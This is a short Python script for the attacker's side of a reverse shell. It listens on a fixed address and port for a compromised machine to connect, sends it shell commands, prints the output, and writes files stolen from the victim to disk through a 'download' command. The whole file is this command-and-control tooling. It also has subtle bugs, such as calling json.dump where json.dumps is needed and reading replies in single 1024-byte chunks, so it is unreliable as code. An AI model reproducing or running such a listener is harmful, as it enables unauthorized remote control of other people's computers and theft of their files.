import socket, json, base64

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Wailting Connection")
        self.connection, address = listener.accept()
        print("[+] Connection Successful from " + str(address))
    
    def safe_send(self, data):
        self.connection.send(json.dump(data))
    
    def safe_receive(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024).decode("UTF-8")
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_commands(self, command):
        self.safe_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.safe_receive()
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] File Was Download Successfuly"
        
    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            command_result = self.execute_commands(command)
            if command[0] == "download":
                message = self.write_file(command[1], command_result)
                print(message)
            else:
                print(command_result)

my_listener = Listener("192.168.1.5", 4444)
my_listener.run()